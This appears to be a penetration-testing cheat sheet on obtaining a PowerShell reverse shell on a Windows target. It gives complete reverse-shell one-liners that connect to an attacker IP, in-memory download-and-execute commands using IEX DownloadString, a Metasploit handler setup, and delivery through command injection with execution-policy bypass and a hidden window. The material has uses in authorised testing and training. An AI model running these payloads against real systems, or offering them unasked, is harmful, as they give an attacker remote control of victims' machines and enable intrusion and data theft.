# PowerShell Reverse Shell

## Option 1

1. Download [powershell_reverse_shell.ps1](https://gist.githubusercontent.com/egre55/c058744a4240af6515eb32b2d33fbed3/raw/2c6e4a2d6fd72ba0f103cce2afa3b492e347edc2/powershell_reverse_shell.ps1)

2. Start a listener on attacker machine

        nc -nlvp 3001

3. Execute following command on the remote machine to obtain a PowerShell reverse shell
   
        powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP_ADDRESS>:4444/powershell_reverse_shell.ps1')"

## Option 2

1. Create `reverse_shell.ps1` PowerShell script with following content

        $client = New-Object System.Net.Sockets.TCPClient('10.14.14.14',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
        $sm=(New-Object Net.Sockets.TCPClient('10.14.14.14',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}

2. Serve the file using a Python3 server (or anything else)

        python3 -m http.server 8000

3. Start `multi/handler` listener using Metasploit

        msfconsole
        use exploit/multi/handler
        set payload windows/shell/reverse_tcp
        set lhost <Attacker_IP>
        set lport 4444
        exploit -j  

4. Deliver exploit via command injection

        powershell.exe -executionpolicy bypass -w hidden "iex(New-Object System.Net.WebClient).DownloadString('http://10.14.14.14:8000/reverse_shell.ps1'); reverse_shell.ps1"

5. View the captured session in Metasploit

        sessions -l
        sessions -i 1

## General

* Execute a powershell script from command line

        > powershell -c Get-ExecutionPolicy
        > powershell -c Set-ExecutionPolicy -Scope CurrentUser Unrestricted
        > powershell -file "C:\Program Files (x86)\DAUM\test.ps1"

## References

* https://gist.githubusercontent.com/egre55/c058744a4240af6515eb32b2d33fbed3/raw/2c6e4a2d6fd72ba0f103cce2afa3b492e347edc2/powershell_reverse_shell.ps1
* https://blog.geoda-security.com/2019/03/reverse-shell-in-memory-utilizing.html